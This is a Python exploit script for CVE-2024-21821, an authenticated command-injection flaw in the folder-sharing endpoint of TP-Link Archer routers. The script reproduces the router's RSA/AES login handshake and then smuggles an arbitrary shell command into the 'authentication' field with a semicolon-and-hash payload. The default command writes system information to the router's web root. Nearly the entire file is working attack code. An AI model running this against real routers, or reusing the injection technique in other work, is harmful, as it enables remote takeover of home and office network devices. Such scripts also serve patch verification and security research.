#!/usr/bin/python3
# CVE-2024-21821
# Exploit Title: TP-Link Archer router series - Authenticated Command Injection (RCE)
# Based on analysis of folder_sharing.lua patch

import argparse
import requests
import binascii, base64, os, re, json, sys, time, random, hashlib
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from urllib.parse import urlencode

# Webclient class is from: https://github.com/aaronsvk/CVE-2022-30075/blob/main/tplink.py
class WebClient(object):

    def __init__(self, target, password):
        self.target = target
        self.password = password.encode('utf-8')
        self.password_hash = hashlib.md5(('admin%s'%password).encode('utf-8')).hexdigest().encode('utf-8')
        self.aes_key = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')
        self.aes_iv = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')

        self.stok = ''
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
        })

        try:
            data = self.basic_request('/login?form=auth', {'operation':'read'})
            if data.get('success') != True:
                print('[!] Failed to get RSA key from /login?form=auth. Router may not be supported.')
                return
            self.sign_rsa_n = int(data['data']['key'][0], 16)
            self.sign_rsa_e = int(data['data']['key'][1], 16)
            self.seq = data['data']['seq']

            data = self.basic_request('/login?form=keys', {'operation':'read'})
            self.password_rsa_n = int(data['data']['password'][0], 16)
            self.password_rsa_e = int(data['data']['password'][1], 16)

            self.stok = self.login()
        except requests.exceptions.RequestException as e:
            print(f"[!] Connection error: {e}")
            sys.exit(-1)
        except Exception as e:
            print(f"[!] An unexpected error occurred during initialization: {e}")
            sys.exit(-1)


    def aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):
        cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
        plaintext_padded = pad(plaintext, aes_block_size)
        return cipher.encrypt(plaintext_padded)


    def aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):
        cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
        plaintext_padded = cipher.decrypt(ciphertext)
        plaintext = unpad(plaintext_padded, aes_block_size)
        return plaintext


    def rsa_encrypt(self, n, e, plaintext):
        public_key = RSA.construct((n, e))
        encryptor = PKCS1_v1_5.new(public_key)
        block_size = int(public_key.n.bit_length()/8) - 11
        encrypted_text = b''
        for i in range(0, len(plaintext), block_size):
            encrypted_text += encryptor.encrypt(plaintext[i:i+block_size])
        return encrypted_text.hex()

    def basic_request(self, url, post_data, files_data={}):
        res = self.session.post(f'http://{self.target}/cgi-bin/luci/;stok={self.stok}{url}', data=post_data, files=files_data, timeout=5)
        return res.json()

    def encrypted_request(self, url, post_data):
        serialized_data = urlencode(post_data)
        encrypted_data = self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, serialized_data.encode('utf-8'))
        encrypted_data = base64.b64encode(encrypted_data)

        signature = ('k=%s&i=%s&h=%s&s=%d'.encode('utf-8')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(encrypted_data))
        encrypted_signature = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, signature)

        res = self.session.post(f'http://{self.target}/cgi-bin/luci/;stok={self.stok}{url}', data={'sign':encrypted_signature, 'data':encrypted_data}, timeout=10)
        if res.status_code != 200:
            print(f'[!] URL "{url}" returned unexpected status code {res.status_code}')
            return None
        
        encrypted_response = res.json()
        if 'data' not in encrypted_response:
            return encrypted_response

        decoded_data = base64.b64decode(encrypted_response['data'])
        decrypted_data = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, decoded_data)
        return json.loads(decrypted_data)


    def login(self):
        password_encrypted = self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)
        post_data = {'operation':'login', 'password':password_encrypted}
        data = self.encrypted_request('/login?form=login', post_data)
        if data is None or data.get('success') != True:
            print('[!] Login failed. Please check your password.')
            sys.exit(-1)
        
        print(f"[+] Logged in successfully. Received token (stok): {data['data']['stok']}")
        return data['data']['stok']

if __name__ == "__main__":
    arg_parser = argparse.ArgumentParser(description="CVE-2024-21821: TP-Link Archer Authenticated RCE in folder_sharing (for unpatched firmware)")
    arg_parser.add_argument('-t', metavar='target', help='IP address of the TP-Link router', required=True)
    arg_parser.add_argument('-p', metavar='password', help='Admin password for the router', required=True)
    arg_parser.add_argument('-c', metavar='cmd', default='uname -a > /www/poc.txt', help='Command to execute on the target')
    args = arg_parser.parse_args()

    client = WebClient(args.t, args.p)

    if client.stok:
        print("[*] Preparing payload for CVE-2024-21821")
        
        endpoint = '/admin/folder_sharing?form=auth'
        # Payload for unpatched firmware based on diff analysis
        # The semicolon separates commands, and the hash comments out the rest of the line.
        injection_payload = f"off; {args.c}; #"
        
        payload = {
            'operation': 'write',
            'authentication': injection_payload
        }

        print(f"[*] Target Endpoint: {endpoint}")
        print(f"[*] Injecting command: {args.c}")

        resp = client.encrypted_request(endpoint, payload)

        # On unpatched firmware, the command should execute, but we may not get a 'success: True'
        # because the lua script continues and might error out after our command runs.
        # The key is whether the command itself executed.
        if resp:
            print(f"[*] Server response: {resp}")

        print("[+] RCE command sent. The target device must be running unpatched firmware for this to work.")
        print(f"[*] Check for the result of the command execution (e.g., by visiting http://{args.t}/poc.txt).")

